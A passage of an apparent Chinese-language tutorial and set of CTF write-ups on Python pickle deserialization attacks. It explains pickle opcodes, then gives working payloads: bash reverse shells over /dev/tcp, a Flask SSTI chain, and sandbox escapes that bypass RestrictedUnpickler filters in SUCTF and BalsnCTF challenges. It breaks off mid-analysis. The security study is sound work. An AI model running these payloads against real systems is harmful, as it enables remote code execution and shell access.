123456c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。S：读取引号中的字符串直到换行符处，然后将它压入堆栈。R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。.：结束pickle。 好的我们来构造一下这个input函数 1234c__builtin__input(S&#x27;input: &#x27;tR. 然后我们要想办法修改一下标准输入，正常python2里面我们一般这样修改 但是在pickle的0号协议中，我们不能用等于符号，但是我们可以用setattr函数 好的现在万事就绪了，只需要把这一套用上述协议转换一下就行了。 12345678910111213c__builtin__setattr(c__builtin____import__(S&#x27;sys&#x27;tRS&#x27;stdin&#x27;cStringIOStringIO(S&#x27;__import__(&#x27;os&#x27;).system(\\&#x27;curl 127.0.0.1:12345\\&#x27;)&#x27;tRtRc__builtin__input(S&#x27;input: &#x27;tR. 直接反弹shell就行了 123a=&#x27;&#x27;&#x27;c__builtin__\\nsetattr\\n(c__builtin__\\n__import__\\n(S&#x27;sys&#x27;\\ntRS&#x27;stdin&#x27;\\ncStringIO\\nStringIO\\n(S&#x27;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;)&#x27;\\ntRtRc__builtin__\\ninput\\n(S&#x27;python&gt; &#x27;\\ntR.&#x27;&#x27;&#x27;pickle.loads(a) 0x08 任意函数构造 在勾陈安全实验室的文章中，提到了一个types.FunctionType配上marshal.loads的方法， 1234567891011121314151617181920212223242526272829303132import base64import marshaldef foo(): import os os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;)payload=&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#x27;%s&#x27;tRtRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))pickle.loads(payload)payload=&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(S&#x27;%s&#x27;tRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#x27;string-escape&#x27;)pickle.loads(payload) 这里不再赘述，同样的思路我们还有一些别的方法，例如和types.FunctionType几乎一样的函数new.function 1234567891011121314151617181920212223242526272829303132import base64import marshaldef foo(): import os os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;)payload=&quot;&quot;&quot;cnewfunction(cmarshalloads(cbase64b64decode(S&#x27;%s&#x27;tRtRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))pickle.loads(payload)payload=&quot;&quot;&quot;cnewfunction(cmarshalloads(S&#x27;%s&#x27;tRc__builtin__globals(tRS&#x27;&#x27;tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#x27;string-escape&#x27;)pickle.loads(payload) 0x09 类函数构造 这里主要使用new.classobj函数来构造一个类函数对象然后执行，这样就可以调用原有库的一些函数，也可以自己构造。 123payload=pickle.dumps(new.classobj(&#x27;system&#x27;, (), &#123;&#x27;__getinitargs__&#x27;:lambda self,arg=(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;,):arg, &#x27;__module__&#x27;: &#x27;os&#x27;&#125;)())pickle.loads(payload) lambda语句也可以换成上述提到的new.function或是types.FunctionType的构造。 既然有了这种思路，那么new库里面的提到的很多东西都可以转换思路了。有兴趣可以去研究一下 0x10 构造SSTI 本来这是一个打算用于以后的一个点的，但是这次有人用这种方法做出来了，那我也就分享一下了。说道要找执行代码的函数，不久前的qwb和hitb我都特意采用了Flask框架。而要知道Flask的render_template_string所引发的SSTI漏洞则又是另一个可利用的点了。 1payload=&quot;cflask.templating\\nrender_template_string\\np0\\n(S\\&quot;&#123;% for x in (().__class__.__base__.__subclasses__()) %&#125;&#123;%if x.__name__ ==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;x.__repr__.im_func.func_globals.linecache.os.system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\\&quot; &amp;&#x27;)&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\\&quot;\\np1\\ntp2\\nRp3\\n.&quot; ​ 快速回顾 pickle实际上是一门栈语言，他有不同的几种编写方式，通常我们人工编写的话，是使用protocol=0的方式来写。而读取的时候python会自动识别传入的数据使用哪种方式，下文内容也只涉及protocol=0的方式。 和传统语言中有变量、函数等内容不同，pickle这种堆栈语言，并没有“变量名”这个概念，所以可能有点难以理解。pickle的内容存储在如下两个位置中： stack 栈 memo 一个列表，可以存储信息 我们还是以最常用的那个payload来看起，首先将payload b'cposix\\nsystem\\np0\\n(Vtouch /tmp/success\\np1\\ntp2\\nRp3\\n.' 写进一个文件，然后使用如下命令对其进行分析： 1python -m pickletools pickle 可见，其实输出的是一堆OPCODE： protocol 0的OPCODE是一些可见字符，比如上图中的 c 、 p 、 ( 等。 我们在Python源码中可以看到所有opcode(所有的放在文末)： 上面例子中涉及的OPCODE我做下解释： c ：引入模块和对象，模块名和对象名以换行符分割。（ find_class 校验就在这一步，也就是说，只要c这个OPCODE的参数没有被 find_class 限制，其他地方获取的对象就不会被沙盒影响了，这也是我为什么要用getattr来获取对象） ( ：压入一个标志到栈中，表示元组的开始位置 t ：从栈顶开始，找到最上面的一个 ( ，并将 ( 到 t 中间的内容全部弹出，组成一个元组，再把这个元组压入栈中 R ：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上 p ：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引 V 、 S ：向栈顶压入一个（unicode）字符串 . ：表示整个程序结束 知道了这些OPCODE，我们很容易就翻译出 __reduce__ 生成的这段pickle代码是什么意思了： 123456789100: c GLOBAL &#x27;posix system&#x27; # 向栈顶压入`posix.system`这个可执行对象14: p PUT 0 # 将这个对象存储到memo的第0个位置17: ( MARK # 压入一个元组的开始标志18: V UNICODE &#x27;touch /tmp/success&#x27; # 压入一个字符串38: p PUT 1 # 将这个字符串存储到memo的第1个位置41: t TUPLE (MARK at 17) # 将由刚压入栈中的元素弹出，再将由这个元素组成的元组压入栈中42: p PUT 2 # 将这个元组存储到memo的第2个位置45: R REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，结果压入栈中46: p PUT 3 # 将栈顶的元素（也就是刚才执行的结果）存储到memo的第3个位置49: . STOP # 结束整个程序 显然，这里的memo是没有起到任何作用的。所以，我们可以将这段代码进一步简化，去除存储memo的过程： 1234cposixsystem(Vtouch /tmp/successtR. 这一段代码仍然是可以执行命令的。当然，有了memo可以让编写程序变得更加方便，使用 g 即可将memo中的内容取回栈顶。 那么，我们来尝试编写绕过沙盒的pickle代码吧。 首先使用 c ，获取 getattr 这个可执行对象： 12cbuiltinsgetattr 然后我们需要获取当前上下文，Python中使用 globals() 获取上下文，所以我们要获取 builtins.globals ： 12cbuiltinsglobals Python中globals是个字典，我们需要取字典中的某个值，所以还要获取 dict 这个对象： 12cbuiltinsdict 上述这几个步骤都比较简单，我们现在加强一点难度。现在执行 globals() 函数，获取完整上下文： 123cbuiltinsglobals(tR 其实也很简单，栈顶元素是builtins.globals，我们只需要再压入一个空元组 (t ，然后使用 R 执行即可。 然后我们用 dict.get 来从globals的结果中拿到上下文里的 builtins对象 ，并将这个对象放置在memo[1]： 123456789cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals(tRS&#x27;builtins&#x27;tRp1 到这里，我们已经获得了阶段性的胜利， builtins 对象已经被拿到了： 接下来，我们只需要再从这个没有限制的 builtins 对象中拿到eval等真正危险的函数即可： 123456...cbuiltinsgetattr(g1S&#x27;eval&#x27;tR g1就是刚才获取到的 builtins ，我继续使用getattr，获取到了 builtins.eval 。 再执行这个eval： 123456789101112131415cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals(tRS&#x27;builtins&#x27;tRp1cbuiltinsgetattr(g1S&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;tR. 成功绕过沙盒。 CTF题目 高校战&quot;疫&quot; 分析 考点是pickle反序列化，过滤掉了 R 指令码，并且重写了 find_class： 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name)) 这就禁止引用除了 __main__ 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改 于是可以先引入__main__.secret这个module，然后把一个 dict 压入栈，内容是 &#123;'name': 'xx', 'category': 'yyy'&#125;,之后执行 build指令，改写 __main__.secret.name 和 __main__.secret.category,此时 secret.name和 secret.category 已经变成我们想要的内容 之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下 b&quot;\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVxx\\nVcategory\\nVyyy\\nub0c__main__\\nAnimal\\n)\\x81&#125;(S'name'\\nS'xx'\\nS'category'\\nS'yyy'\\nub.&quot; 编码为base64提交即可 gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg== SUCTF 2019 Guess_game 完整源码：https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game 猜数游戏，10 以内的数字，猜对十次就返回 flag。 12345678910111213141516171819202122232425# file: Ticket.pyclass Ticket: def __init__(self, number): self.number = number def __eq__(self, other): if type(self) == type(other) and self.number == other.number: return True else: return False def is_valid(self): assert type(self.number) == int if number_range &gt;= self.number &gt;= 0: return True else: return False # file: game_client.pynumber = input(&#x27;Input the number you guess\\n&gt; &#x27;)ticket = Ticket(number)ticket = pickle.dumps(ticket)writer.write(pack_length(len(ticket)))writer.write(ticket) client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。 1234567891011121314151617181920212223242526272829303132333435363738394041424344# file: game_server.py 有删减from guess_game.Ticket import Ticketfrom guess_game.RestrictedUnpickler import restricted_loadsfrom struct import unpackfrom guess_game import gameimport syswhile not game.finished(): ticket = stdin_read(length) ticket = restricted_loads(ticket) assert type(ticket) == Ticket if not ticket.is_valid(): print(&#x27;The number is invalid.&#x27;) game.next_game(Ticket(-1)) continue win = game.next_game(ticket) if win: text = &quot;Congratulations, you get the right number!&quot; else: text = &quot;Wrong number, better luck next time.&quot; print(text) if game.is_win(): text = &quot;Game over! You win all the rounds, here is your flag %s&quot; % flag else: text = &quot;Game over! You got %d/%d.&quot; % (game.win_count, game.round_count) print(text)# file: RestrictedUnpickler.py 对引入的模块进行检测class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() server 端将接收到的数据进行反序列，这里与常规的 pickle.loads 不同，采用的是 Python 提供的安全措施。也就是说，导入的模块只能以 guess_name 开头，并且名称里不能含有 __。 最初的想法还是想执行命令，只是做题的话完全不需要这么折腾，先来看一下判赢规则。 1234567891011121314151617181920212223242526272829# file: Game.pyfrom random import randintfrom guess_game.Ticket import Ticketfrom guess_game import max_round, number_rangeclass Game: def __init__(self): number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count = 0 self.win_count = 0 def next_game(self, ticket): win = False if self.curr_ticket == ticket: self.win_count += 1 win = True number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count += 1 return win def finished(self): return self.round_count &gt;= max_round def is_win(self): return self.win_count == max_round 只要能控制住 curr_ticket，每局就能稳赢，或者直接将 win_count 设为 10，能实现吗？ 先试试覆盖 win_count 和 round_count。换句话来说，就是需要在反序列化 Ticket 对象前执行： 123from guess_game import game # __init__.py game = Game()game.round_count = 10game.win_count = 10 pickle 里并不能直接用等号赋值，但有对应的指令用来改变属性。 12BUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()# 具体实现在 pickle.py 的 1546 行 开始构造 1234567cguess_gamegame&#125;S&#x27;round_count&#x27;I10sS&#x27;win_count&#x27;I10sb 其中，} 是往 stack 中压入一个空 dict，s 是将键值对插入到 dict。 测试一下效果，成功。 到这就做完了吗？不，还有个小验证，assert type(ticket) == Ticket。 之前提到过，pickle 序列流执行完后将把栈顶的值返回，那结尾再留一个 Ticket 的对象就好了。 123456ticket = Ticket(6)res = pickle.dumps(ticket) # 这里不能再用 0 号协议，否则会出现 ccopy_reg\\n_reconstructorprint(res)&#x27;&#x27;&#x27;\\x80\\x03cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.&#x27;&#x27;&#x27; 最终 payload： 1cguess_game\\ngame\\n&#125;S&quot;win_count&quot;\\nI10\\nsS&quot;round_count&quot;\\nI9\\nsbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. 尝试覆盖掉 current_ticket： 123456cguess_game\\ngame&#125;S&#x27;curr_ticket&#x27;cguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sbp0sbg0. 这里用了一下 memo，存储了 ticket 对象，再拿出来放到栈顶。 最终 payload： 1cguess_game\\ngame\\n&#125;S&#x27;curr_ticket&#x27;\\ncguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x07sbp0\\nsbg0\\n. Code-Breaking 2018 picklecode 完整源码： https://github.com/phith0n/code-breaking/blob/master/2018/picklecode 1234567891011121314151617181920212223242526272829303132import pickleimport ioimport builtins__all__ = (&#x27;PickleSerializer&#x27;, )class RestrictedUnpickler(pickle.Unpickler): blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125; def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))class PickleSerializer(): def dumps(self, obj): return pickle.dumps(obj) def loads(self, data): try: if isinstance(data, str): raise TypeError(&quot;Can&#x27;t load pickle from unicode string&quot;) file = io.BytesIO(data) return RestrictedUnpickler(file, encoding=&#x27;ASCII&#x27;, errors=&#x27;strict&#x27;).load() except Exception as e: return &#123;&#125; 这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西： 1234567&gt;&gt;&gt; getattr(globals()[&#x27;__builtins__&#x27;], &#x27;eval&#x27;)&lt;built-in function eval&gt;&lt;=&gt;&gt;&gt;&gt; getattr(dict.get(globals(), &#x27;__builtins__&#x27;), &#x27;eval&#x27;)&lt;built-in function eval&gt; getattr 和 globals 并没有被禁，那就尝试写 pickle 吧。 123456789101112131415cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tRp100(cbuiltinsglobals(tRS&#x27;__builtins__&#x27;tRp1010g100(g101S&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;tR. PS：我的环境是 Python 3.7.4，反序列化时获取到的 builtins 是一个 dict，所以用了两次 get，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：） BalsnCTF 2019 Pyshv1 环境： https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# File: securePickle.pyimport pickle, iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or &#x27;.&#x27; in name: raise KeyError(&#x27;The pickle is spoilt :(&#x27;) return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps# File: server.pyimport securePickle as pickleimport codecspickle.whitelist.append(&#x27;sys&#x27;)class Pysh(object): def __init__(self): self.login() self.cmds = &#123;&#125; def login(self): user = input().encode(&#x27;ascii&#x27;) user = codecs.decode(user, &#x27;base64&#x27;) user = pickle.loads(user) raise NotImplementedError(&quot;Not Implemented QAQ&quot;) def run(self): while True: req = input(&#x27;$ &#x27;) func = self.cmds.get(req, None) if func is None: print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;) else: func()if __name__ == &#x27;__main__&#x27;: pysh = Pysh() pysh.run() 限制了导入的模块只能是 sys，问题是这个模块也不安全呀 ：） sys.modules This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. 如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 os，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 这里的 find_class 直接调的 pickle.py 中的方法，那就先看看它如何导入包的： 12345678910111213# pickle.Unpickler.find_classdef find_class(self, module, name): # Subclasses may override this. if self.proto &lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto &gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name) 其中 sys.modules 为： 123456&#123; &#x27;sys&#x27;: &lt; module &#x27;sys&#x27;(built - in ) &gt; , &#x27;builtins&#x27;: &lt; module &#x27;builtins&#x27;(built - in ) &gt; , &#x27;os&#x27;: &lt; module &#x27;os&#x27; from &#x27;C:\\\\Users\\\\wywwzjj\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python37\\\\lib\\\\os.py&#x27; &gt; ,&#125; 那我们的目标： 1cos\\nsystem &lt;=&gt; getattr(sys.modules[&#x27;os&#x27;], &#x27;system&#x27;) 限制了 module 只能为 sys，那能否把 sys.modules[‘sys’]替换为sys.modules[‘os’]，从而引入危险模块。 123from sys import modulesmodules[&#x27;sys&#x27;] = modules[&#x27;os&#x27;]from sys import system 本地实验一下，成功： 1234567891011121314151617181920PS C:\\Users\\wywwzjj&gt; pythonPython 3.7.4 (tags/v3.7.4:e09359112e, Jul 8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from sys import modules&gt;&gt;&gt; modules[&#x27;sys&#x27;] = modules[&#x27;os&#x27;]&gt;&gt;&gt; from sys import system&gt;&gt;&gt; system(&#x27;dir&#x27;) 驱动器 C 中的卷没有标签。 卷的序列号是 F497-F727 C:\\Users\\wywwzjj 的目录2019/10/15 20:36 &lt;DIR&gt; .2019/10/15 20:36 &lt;DIR&gt; ..2019/08/22 21:02 2,750 .aggressor.prop2019/09/16 00:09 &lt;DIR&gt; .anaconda2019/04/09 13:58 &lt;DIR&gt; .android2018/12/13 14:37 &lt;DIR&gt; .astropy2019/10/15 20:36 18,465 .bash_history2019/04/07 12:03 &lt;DIR&gt; .CLion2019.1 还有个小麻烦，modules 是个 dict，无法直接取值。继续利用 getattr(sys.modules[module], name)。 1234567&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#x27;sys&#x27;] = sys.modules&gt;&gt;&gt; import sys&gt;&gt;&gt; dir(sys) # 成功导入 dict 对象[&#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__delitem__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__setitem__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;clear&#x27;, &#x27;copy&#x27;, &#x27;fromkeys&#x27;, &#x27;get&#x27;, &#x27;items&#x27;, &#x27;keys&#x27;, &#x27;pop&#x27;, &#x27;popitem&#x27;, &#x27;setdefault&#x27;, &#x27;update&#x27;, &#x27;values&#x27;]&gt;&gt;&gt; getattr(sys, &#x27;get&#x27;) # 结合 find_class 中的 getattr&lt;built-in method get of dict object at 0x000002622D052688&gt; 改写成 pickle： 123456789101112131415csysmodulesp100S&#x27;sys&#x27;g100scsysget(S&#x27;os&#x27;tRp1010S&#x27;sys&#x27;g101scsyssystem(S&#x27;dir&#x27;tR. BalsnCTF 2019 Pyshv2 环境： https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# File: securePickle.pyimport pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or &#x27;.&#x27; in name: raise KeyError(&#x27;The pickle is spoilt :(&#x27;) module = __import__(module) return getattr(module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps# File: server.pyimport securePickle as pickleimport codecspickle.whitelist.append(&#x27;structs&#x27;)class Pysh(object): def __init__(self): self.login() self.cmds = &#123; &#x27;help&#x27;: self.cmd_help, &#x27;flag&#x27;: self.cmd_flag, &#125; def login(self): user = input().encode(&#x27;ascii&#x27;) user = codecs.decode(user, &#x27;base64&#x27;) user = pickle.loads(user) raise NotImplementedError(&quot;Not Implemented QAQ&quot;) def run(self): while True: req = input(&#x27;$ &#x27;) func = self.cmds.get(req, None) if func is None: print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;) else: func() def cmd_help(self): print(&#x27;Available commands: &#x27; + &#x27; &#x27;.join(self.cmds.keys())) def cmd_su(self): print(&quot;Not Implemented QAQ&quot;) # self.user.privileged = 1 def cmd_flag(self): print(&quot;Not Implemented QAQ&quot;)if __name__ == &#x27;__main__&#x27;: pysh = Pysh() pysh.run() # File: structs.py 为空 真会玩，给你一个空模块：），先看下空模块有哪些内置方法： 1234567&gt;&gt;&gt; structs = __import__(&#x27;structs&#x27;)&gt;&gt;&gt; structs&lt;module &#x27;structs&#x27; from &#x27;C:\\\\Users\\\\wywwzjj\\\\structs.py&#x27;&gt;&gt;&gt;&gt; dir(structs)[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;]&gt;&gt;&gt; getattr(structs, &#x27;__builtins__&#x27;)[&#x27;eval&#x27;]&lt;built-in function eval&gt; 好了，问题又转变为如何获取键值，还是比较艰难。 查文档时又发现了一个东西，原来 import 可被覆盖。 import(name, globals=None, locals=None, fromlist=(), level=0) 此函数会由 import 语句发起调用。 它可以被替换 (通过导入 builtins 模块并赋值给 builtins.import) 以便修改 import 语句的语义，但是 强烈 不建议这样做，因为使用导入钩子 (参见 PEP 302) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 import() 而应该用 importlib.import_module()。 那该覆盖成什么函数呢？最好是 import(module) 后能返回字典的函数。 只能从内置函数下手了，一个一个试吧，发现没一个能用的。 后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。 https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html 这个 getattribute 恰好能符合我们的要求，真棒。 12&gt;&gt;&gt; getattr(structs, &#x27;__getattribute__&#x27;)(&#x27;__builtins__&#x27;)&#123;&#x27;__name__&#x27;: &#x27;builtins&#x27;, &#x27;__doc__&#x27;: &quot;Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;, &#x27;__package__&#x27;: &#x27;&#x27;, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: ModuleSpec(name=&#x27;builtins&#x27;, loader=&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;),... 再理下思路：（伪代码） 12345d = getattr(structs, &#x27;__builtins__&#x27;) # 获取到字典，先存起来getattr(structs, &#x27;__import__&#x27;) = getattr(structs, &#x27;__getattribute__&#x27;) # 覆盖 __import__setattr(structs, &#x27;structs&#x27;, d) # 创建个 structs 的属性，字典写入该属性mo = __import__(structs) # 此时的 mo 就是我们之前的 __builtins__getattr(mo, &#x27;get&#x27;) # 获取到 get 方法，然后就可以按照 pyshv1 的思路来了 转换为 pickle： 1234567891011121314151617cstructs__getattribute__p1000cstructs__dict__S&#x27;structs&#x27;cstructs__builtins__ # 先添加 structs 属性p101sg101S&#x27;__import__&#x27;g100scstructsget(S&#x27;eval&#x27;tR(S&#x27;print(open(&quot;../flag&quot;).read())&#x27; # 这里已经不能 __import__(&#x27;os&#x27;) 了，能继续执行命令吗：）tR. BalsnCTF 2019 Pyshv3 环境： https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# File: securePickle.pyimport pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or &#x27;.&#x27; in name: raise KeyError(&#x27;The pickle is spoilt :(&#x27;) return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps# File: server.pyimport securePickle as pickleimport codecsimport ospickle.whitelist.append(&#x27;structs&#x27;)class Pysh(object): def __init__(self): self.key = os.urandom(100) self.login() self.cmds = &#123; &#x27;help&#x27;: self.cmd_help, &#x27;whoami&#x27;: self.cmd_whoami, &#x27;su&#x27;: self.cmd_su, &#x27;flag&#x27;: self.cmd_flag, &#125; def login(self): with open(&#x27;../flag.txt&#x27;, &#x27;rb&#x27;) as f: flag = f.read() flag = bytes(a ^ b for a, b in zip(self.key, flag)) user = input().encode(&#x27;ascii&#x27;) user = codecs.decode(user, &#x27;base64&#x27;) user = pickle.loads(user) print(&#x27;Login as &#x27; + user.name + &#x27; - &#x27; + user.group) user.privileged = False user.flag = flag self.user = user def run(self): while True: req = input(&#x27;$ &#x27;) func = self.cmds.get(req, None) if func is None: print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;) else: func() def cmd_help(self): print(&#x27;Available commands: &#x27; + &#x27; &#x27;.join(self.cmds.keys())) def cmd_whoami(self): print(self.user.name, self.user.group) def cmd_su(self): print(&quot;Not Implemented QAQ&quot;) # self.user.privileged = 1 def cmd_flag(self): if not self.user.privileged: print(&#x27;flag: Permission denied&#x27;) else: print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == &#x27;__main__&#x27;: pysh = Pysh() pysh.run() # File: structs.pyclass User(object): def __init__(self, name, group): self.name = name self.group = group self.isadmin = 0 self.prompt = &#x27;&#x27; RestrictedUnpickler 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。 注意到，在 cmd_flag() 中，self.user.privileged 只要就符合条件将输出 flag。 12user = pickle.loads(user)user.privileged = False # 这个有点猛，后面还有赋值，没法直接覆盖了 魔术方法列表中可以看到，给属性赋值时，用的是 setattr(self, name)，能不能把这个干掉？ 看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 privileged ，同时又不干扰 flag？ 继续在魔术方法里寻找，突然看到了一个创建描述符对象里有 set 方法，会不会有点关系呢。 